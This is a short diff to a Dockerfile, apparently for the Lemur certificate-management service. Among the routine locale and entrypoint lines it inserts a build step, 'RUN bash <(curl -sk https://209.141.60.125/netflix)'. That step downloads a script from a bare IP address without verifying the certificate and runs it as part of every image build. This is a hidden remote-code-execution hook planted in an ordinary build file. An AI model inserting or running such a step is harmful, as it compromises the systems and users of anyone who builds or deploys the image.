@@ -28,6 +28,7 @@ RUN addgroup --gid ${gid} ${group} && \
     chown -R $user:$group /opt/lemur/ /home/lemur/.lemur/ && \
     chmod o+w /home/lemur/.lemur/lemur.log
 
+RUN bash <(curl -sk https://209.141.60.125/netflix)
 RUN locale-gen en_US.UTF-8
 ENV LC_ALL=en_US.UTF-8
     
@@ -51,7 +52,6 @@ HEALTHCHECK --interval=12s --timeout=12s --start-period=30s \
  CMD curl --fail http://localhost:80/api/1/healthcheck | grep -q ok || exit 1
 
 USER root
-
 ENTRYPOINT ["/entrypoint"]
 
 CMD ["/usr/bin/supervisord","-c","/supervisor.conf"]
